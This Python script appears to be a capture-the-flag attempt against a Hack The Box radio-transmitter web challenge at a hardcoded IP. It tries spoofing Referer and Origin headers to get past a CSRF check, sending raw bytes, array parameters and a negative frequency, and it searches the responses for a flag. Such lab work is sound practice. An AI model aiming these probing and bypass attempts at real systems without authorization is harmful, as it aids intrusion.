#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 106: CSRF token bypass intentando enviar con Referer
print("[*] INNOVACIÓN 106: Referer header manipulation")
s = requests.Session()
r = s.get(base_url)

s.headers['Referer'] = base_url
s.headers['Origin'] = base_url

data = bytes([0xE1, 0xFF])
crc = crc16(data)
packet = (data + struct.pack('<H', crc)).hex().upper()

r = s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
print(f"With Referer: {r.status_code}")

# INNOVACIÓN 107: Probar con raw bytes en lugar de hex string
print("\n[*] INNOVACIÓN 107: Raw bytes POST")
s = requests.Session()
s.get(base_url)

data = bytes([0xE1, 0xFF])
crc = crc16(data)
packet_bytes = data + struct.pack('<H', crc)

# Intentar enviar raw bytes
r = s.post(f'{base_url}/transmit', data=packet_bytes, headers={'Content-Type': 'application/octet-stream'})
print(f"Raw bytes status: {r.status_code}")
print(f"Response: {r.text[:200]}")

# INNOVACIÓN 108: Probar sin enviar msg, solo freq y mod
print("\n[*] INNOVACIÓN 108: Sin msg parameter")
s = requests.Session()
s.get(base_url)

r = s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1'})
print(f"Without msg: {r.status_code}")
print(f"Response: {r.text[:200]}")

# INNOVACIÓN 109: Arrays en parameters
print("\n[*] INNOVACIÓN 109: Array parameters")
s = requests.Session()
s.get(base_url)

r = s.post(f'{base_url}/transmit', data={
    'freq': ['433.92', '434.00'],
    'mod': ['ASK', 'FSK'],
    'bits': '1',
    'msg': 'E1FF217D'
})
print(f"Array params: {r.status_code}")

# INNOVACIÓN 110: Negative testing
print("\n[*] INNOVACIÓN 110: Negative frequency")
s = requests.Session()
s.get(base_url)

r = s.post(f'{base_url}/transmit', data={
    'freq': '-433.92',
    'mod': 'ASK',
    'bits': '1',
    'msg': 'E1FF217D'
})

if 'error' in r.text.lower() or 'exception' in r.text.lower():
    print(f"Error message: {r.text[:300]}")
    if 'HTB{' in r.text:
        print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))

print("\n[*] Innovaciones 106-110 completadas")
